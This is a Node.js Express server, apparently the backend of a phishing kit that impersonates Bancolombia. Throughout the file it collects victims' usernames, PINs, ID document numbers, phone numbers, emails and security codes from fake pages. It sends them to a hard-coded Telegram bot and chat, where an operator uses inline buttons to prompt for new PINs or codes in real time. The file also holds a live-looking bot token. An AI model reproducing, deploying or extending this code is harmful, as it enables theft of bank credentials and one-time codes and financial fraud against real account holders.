// server.js
const express = require('express');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store para manejar sesiones temporales
const sessions = new Map();

// Telegram Bot API
const TELEGRAM_BOT_TOKEN ='8431946474:AAGwPGma91nER9-mCScFLy3AvOChIZIoa0M';
const TELEGRAM_CHAT_ID ='-4855438579';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Función para enviar mensaje a Telegram con botones
async function sendTelegramMessage(message, buttons, sessionId) {
    try {
        const inlineKeyboard = buttons.map(row => 
            row.map(button => ({
                text: button.text,
                callback_data: `${button.action}:${sessionId}`
            }))
        );

        const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: inlineKeyboard
                }
            })
        });

        return await response.json();
    } catch (error) {
        console.error('Error enviando mensaje a Telegram:', error);
        return null;
    }
}

// Generar ID único para sesión
function generateSessionId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// API Endpoints

// 1. Enviar datos de usuario y clave (desde password.html)
app.post('/api/send-login', async (req, res) => {
    try {
        const { username, pin } = req.body;
        const sessionId = generateSessionId();
        const timestamp = new Date().toLocaleString('es-CO');

        // Guardar sesión
        sessions.set(sessionId, {
            username,
            pin,
            timestamp,
            status: 'pending_login'
        });

        // Mensaje para Telegram
        const message = `🏦 NUEVOS DATOS BANCOLOMBIA\n\n👤 Usuario: ${username}\n🔐 Clave Principal: ${pin}\n\n⏰ ${timestamp}`;

        // Botones para el primer envío
        const buttons = [
            [{ text: '✅ CONTINUAR CON DATOS CONTACTO', action: 'continue_contact' }],
            [{ text: '🔄 SOLICITAR NUEVA CLAVE', action: 'request_new_pin' }],
            [{ text: '❌ RECHAZAR SOLICITUD', action: 'reject_request' }]
        ];

        const telegramResponse = await sendTelegramMessage(message, buttons, sessionId);

        if (telegramResponse && telegramResponse.ok) {
            res.json({
                success: true,
                sessionId,
                message: 'Datos enviados a Telegram exitosamente'
            });
        } else {
            throw new Error('Error enviando mensaje a Telegram');
        }

    } catch (error) {
        console.error('Error en /api/send-login:', error);
        res.status(500).json({
            success: false,
            error: 'Error interno del servidor'
        });
    }
});

// 2. Verificar estado de sesión (para loading.html)
app.get('/api/check-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);

    if (!session) {
        return res.status(404).json({
            success: false,
            error: 'Sesión no encontrada'
        });
    }

    res.json({
        success: true,
        status: session.status,
        nextAction: session.nextAction || null
    });
});

// 3. Enviar datos de contacto (desde contact.html)
app.post('/api/send-contact', async (req, res) => {
    try {
        const { document, phone, email, sessionId } = req.body;
        const session = sessions.get(sessionId);

        if (!session) {
            return res.status(404).json({
                success: false,
                error: 'Sesión no encontrada'
            });
        }

        // Actualizar sesión
        session.document = document;
        session.phone = phone;
        session.email = email;
        session.status = 'contact_received';

        sessions.set(sessionId, session);

        res.json({
            success: true,
            message: 'Datos de contacto guardados'
        });

    } catch (error) {
        console.error('Error en /api/send-contact:', error);
        res.status(500).json({
            success: false,
            error: 'Error interno del servidor'
        });
    }
});

// 4. Enviar código de seguridad (desde security-code.html)
app.post('/api/send-security-code', async (req, res) => {
    try {
        const { securityCode, sessionId } = req.body;
        const session = sessions.get(sessionId);

        if (!session) {
            return res.status(404).json({
                success: false,
                error: 'Sesión no encontrada'
            });
        }

        // Actualizar sesión
        session.securityCode = securityCode;
        session.status = 'security_code_received';

        const timestamp = new Date().toLocaleString('es-CO');

        // Mensaje completo para Telegram
        const message = `🔐 CÓDIGO DE SEGURIDAD RECIBIDO\n\n👤 Usuario: ${session.username}\n🔑 Clave: ${session.pin}\n📄 Documento: ${session.document}\n📱 Celular: ${session.phone}\n📧 Email: ${session.email}\n🔒 Código Seguridad: ${securityCode}\n\n⏰ ${timestamp}`;

        // Botones para el segundo envío
        const buttons = [
            [{ text: '✅ APROBAR PRE-SOLICITUD', action: 'approve_request' }],
            [{ text: '🔄 REENVIAR CÓDIGO SEGURIDAD', action: 'resend_code' }],
            [{ text: '❌ RECHAZAR DEFINITIVAMENTE', action: 'reject_final' }]
        ];

        const telegramResponse = await sendTelegramMessage(message, buttons, sessionId);

        if (telegramResponse && telegramResponse.ok) {
            sessions.set(sessionId, session);
            
            res.json({
                success: true,
                message: 'Código de seguridad enviado a Telegram'
            });
        } else {
            throw new Error('Error enviando mensaje a Telegram');
        }

    } catch (error) {
        console.error('Error en /api/send-security-code:', error);
        res.status(500).json({
            success: false,
            error: 'Error interno del servidor'
        });
    }
});

// 5. Webhook para recibir respuestas del bot de Telegram
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, (req, res) => {
    try {
        const update = req.body;

        // Verificar si es un callback query (botón presionado)
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const [action, sessionId] = callbackData.split(':');
            const session = sessions.get(sessionId);

            if (!session) {
                console.error('Sesión no encontrada:', sessionId);
                return res.sendStatus(200);
            }

            // Procesar acción según el botón presionado
            switch (action) {
                case 'continue_contact':
                    session.status = 'approved_for_contact';
                    session.nextAction = 'show_contact_form';
                    break;

                case 'request_new_pin':
                    session.status = 'request_new_pin';
                    session.nextAction = 'show_pin_form';
                    break;

                case 'reject_request':
                    session.status = 'rejected';
                    session.nextAction = 'show_rejection';
                    break;

                case 'approve_request':
                    session.status = 'approved';
                    session.nextAction = 'show_success';
                    break;

                case 'resend_code':
                    session.status = 'resend_code';
                    session.nextAction = 'show_security_form';
                    break;

                case 'reject_final':
                    session.status = 'rejected_final';
                    session.nextAction = 'show_rejection';
                    break;

                default:
                    console.error('Acción no reconocida:', action);
            }

            sessions.set(sessionId, session);

            // Responder al webhook de Telegram
            fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    callback_query_id: update.callback_query.id,
                    text: 'Acción procesada ✓'
                })
            });
        }

        res.sendStatus(200);

    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Servir archivos estáticos
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('*', (req, res) => {
    const filePath = path.join(__dirname, 'public', req.path + '.html');
    res.sendFile(filePath, (err) => {
        if (err) {
            res.sendFile(path.join(__dirname, 'public', 'index.html'));
        }
    });
});

// Limpiar sesiones antiguas cada hora
setInterval(() => {
    const oneHourAgo = Date.now() - (60 * 60 * 1000);
    for (const [sessionId, session] of sessions.entries()) {
        const sessionTime = parseInt(sessionId.split('r')[0], 36);
        if (sessionTime < oneHourAgo) {
            sessions.delete(sessionId);
        }
    }
}, 60 * 60 * 1000);

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en puerto ${PORT}`);
    console.log(`📱 Bot de Telegram configurado`);
    console.log(`🌐 Webhook: /webhook/${TELEGRAM_BOT_TOKEN}`);
});

module.exports = app;